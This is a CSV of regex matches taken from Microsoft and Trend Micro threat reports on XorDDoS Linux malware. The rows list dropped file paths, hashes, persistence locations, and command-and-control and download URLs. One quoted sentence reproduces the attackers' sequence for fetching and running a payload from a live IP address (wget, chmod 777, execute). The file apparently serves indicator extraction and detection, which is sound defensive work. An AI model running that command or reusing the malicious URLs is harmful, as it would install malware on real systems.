report,regex,matched word,sentence number,sentence
Xorddos-Microsoft,/run/,/run/gcc.pid,250,"dropped files
dropped file path	file type	sha-256
/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea"
Xorddos-Microsoft,/etc/cron,/etc/cron.hourly/gcc.sh,250,"dropped files
dropped file path	file type	sha-256
/etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf
/etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459
/lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432
/run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a
/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
/usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c
/usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3
/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
/usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b
/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
/usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a
/usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7
/usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489
/usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd
/usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7
/usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4
/tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2
/usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394
/usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39
/usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e
/usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25
/usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea"
Xorddos-Microsoft,"[a-zA-z]:\d{1,5}$",www.gzcfr5axf6.com:3306,251,"download urls
www.enoan2107.com:3306
www.gzcfr5axf6.com:3306
hxxp://aa.hostasa.org/config.rar"
Xorddos-Trendmicro,/etc/cron,/etc/cron.hourly/gcc.sh,22,"this backdoor drops the following files:

/etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems)
backdoor routine"
Xorddos-Trendmicro,"[a-zA-z]:\d{1,5}$",{blocked}t456.com/dd.rar:1520,24,{blocked}t456.com/dd.rar:1520
Xorddos-Trendmicro,/etc/rc,/etc/rc.d/rc{1-5}.d/s90{random,27,"creates symbolic links which points to the script in /etc/init.d:
/etc/rc{1-5}.d/s90{random numbers}
/etc/rc.d/rc{1-5}.d/s90{random numbers}
get the magic string value from the file /var/run/gcc.pid
read the following from its configuration file:
md5 - checksum of file
denyip - open communication with an ip
filename - list of filename
rmfile - files to remove"
Xorddos-Trendmicro,/run/,/var/run/gcc.pid,27,"creates symbolic links which points to the script in /etc/init.d:
/etc/rc{1-5}.d/s90{random numbers}
/etc/rc.d/rc{1-5}.d/s90{random numbers}
get the magic string value from the file /var/run/gcc.pid
read the following from its configuration file:
md5 - checksum of file
denyip - open communication with an ip
filename - list of filename
rmfile - files to remove"
Xorddos-Trendmicro,/var/run/,/var/run/gcc.pid,27,"creates symbolic links which points to the script in /etc/init.d:
/etc/rc{1-5}.d/s90{random numbers}
/etc/rc.d/rc{1-5}.d/s90{random numbers}
get the magic string value from the file /var/run/gcc.pid
read the following from its configuration file:
md5 - checksum of file
denyip - open communication with an ip
filename - list of filename
rmfile - files to remove"
Xorddos-Trendmicro,/var/,/var/run/gcc.pid,27,"creates symbolic links which points to the script in /etc/init.d:
/etc/rc{1-5}.d/s90{random numbers}
/etc/rc.d/rc{1-5}.d/s90{random numbers}
get the magic string value from the file /var/run/gcc.pid
read the following from its configuration file:
md5 - checksum of file
denyip - open communication with an ip
filename - list of filename
rmfile - files to remove"
Xorddos-Trendmicro2,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",http://122.51.133.49:10086/vip,15,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:

wget http://122.51.133.49:10086/vip –o vip
chmod 777 vip
./vip
the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
Xorddos-Trendmicro2,"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",http://122.51.133.49:10086/vip,47,"indicators of compromise
kaiji

file name	sha 256	trend micro pattern detection
123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
related urls:

http://62.171.160.189/linux_arm
http://62.171.160.189/11/123.sh
xorddos and other malware variants found through the same url

sha 256	trend micro pattern detection
dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
related url:

http://122.51.133.49:10086/vip"
